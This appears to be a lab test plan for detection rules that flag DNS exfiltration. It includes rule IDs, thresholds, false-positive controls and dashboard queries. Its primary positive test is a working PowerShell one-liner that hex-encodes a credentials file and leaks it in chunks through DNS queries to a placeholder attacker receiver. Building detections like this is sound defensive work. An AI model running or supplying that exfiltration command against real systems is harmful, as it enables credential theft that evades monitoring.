# DNS credential-file exfiltration

## Rule file

`rules/dns_exfiltration_detection.xml`

## Detection layers

```text
100533 / level 5  — atomic long hex or RFC 4648 Base32-compatible DNS label
100534 / level 12 — sequenced session/sequence/total transport framing
100535 / level 11 — PowerShell acquisition + encoding + chunking + DNS combined behavior
100546 / level 12 — five encoded labels from one process inside 15 seconds
```

Rule `100546` is framing-independent. The threshold was selected from the retained 2026-08-06 corpus: the validated exfiltration emitted eight matching labels in under three seconds, while the closest observed benign long-hex burst emitted four events in fifteen seconds.

## Primary positive

Kali: start the bounded UDP/53 receiver on the verified host-only address.

WIN01, Yassine PowerShell:

```powershell
$p="$env:USERPROFILE\Documents\Finance\Q3_Acquisition_DB_Credentials.txt";$b=[IO.File]::ReadAllBytes($p);$h=-join($b|ForEach-Object{$_.ToString('x2')});$n=0;for($o=0;$o-lt$h.Length;$o+=48){$n++};$s='w'+('{0:x6}'-f(Get-Random -Maximum 16777215));$i=0;for($o=0;$o-lt$h.Length;$o+=48){$l=48;if(($o+$l)-gt$h.Length){$l=$h.Length-$o};$c=$h.Substring($o,$l);Resolve-DnsName -Name "$s.$i.$n.$c.x.lab" -Server <KALI_HOST_ONLY> -Type A -DnsOnly -NoHostsFile -QuickTimeout -ErrorAction Stop|Out-Null;$i++;Start-Sleep -Milliseconds 75};"DNS_EXFIL_COMPLETE chunks=$n session=$s"
```

Require exact receiver byte count and SHA-256, then live rules `100534`, `100535`, and `100546`. Rule `100533` is the lower-severity parent and may be superseded by its high-confidence children in final alert selection.

## Framing-independent burst positive

This control validates `100546` without the old session/sequence/total grammar. It sends five unique, random 48-character hexadecimal labels from one PowerShell process; it is detection proof, not file-transfer impact proof.

```powershell
$r=New-Object Security.Cryptography.RNGCryptoServiceProvider;1..5|ForEach-Object{$b=New-Object byte[] 24;$r.GetBytes($b);$l=-join($b|ForEach-Object{$_.ToString('x2')});Resolve-DnsName -Name "$l.dns-burst-control.invalid" -Type A -DnsOnly -NoHostsFile -QuickTimeout -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 150};$r.Dispose()
```

Expected: atomic visibility and one `100546` burst alert after the fifth qualifying query; no `100534` because the old framing is absent.

## False-positive tests

Normal internal lookup:

```powershell
Resolve-DnsName "dc01.simulation.local" -Type A -DnsOnly|Out-Null
```

Expected: DNS Client telemetry and no `100533`, `100534`, `100535`, or `100546`.

Single vendor-style long-label boundary:

```powershell
Resolve-DnsName "0123456789abcdef0123456789abcdef.single-label-control.invalid" -Type A -DnsOnly -NoHostsFile -QuickTimeout -ErrorAction SilentlyContinue|Out-Null
```

Expected: low-severity atomic `100533` may fire; level-12 `100534` and `100546` plus level-11 combined-behavior `100535` must not.

Displaced framed-label control:

```powershell
Resolve-DnsName -Name ("sess.1.5.normal."+('a'*48)+".invalid") -Type A -DnsOnly -NoHostsFile -QuickTimeout -ErrorAction SilentlyContinue|Out-Null
```

Expected: low-severity `100533` only. Rule `100534` must not fire because the encoded label is not the fourth frame label.

Alphabet-only Base32 boundary:

```powershell
Resolve-DnsName -Name (('a'*48)+".base32-control.invalid") -Type A -DnsOnly -NoHostsFile -QuickTimeout -ErrorAction SilentlyContinue|Out-Null
```

Expected: atomic `100533`. Alphabet-only RFC 4648 Base32-compatible labels must not bypass visibility; a single query still must not trigger `100546`.

Four-label burst boundary (run at least 30 seconds away from any other encoded-label test):

```powershell
1..4|ForEach-Object{$l=('a'*47)+"$_";Resolve-DnsName -Name "$l.four-label-control.invalid" -Type A -DnsOnly -NoHostsFile -QuickTimeout -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 150}
```

Expected: atomic visibility only; no `100546` before the fifth same-process event.

## Dashboard

```text
agent.id:"004" AND rule.id:("100533" OR "100534" OR "100535" OR "100546")
```

High-confidence:

```text
agent.id:"004" AND rule.id:("100534" OR "100535" OR "100546")
```

## Cleanup

Stop the Kali DNS receiver. Retain the controlled fixture unless cleanup is requested.
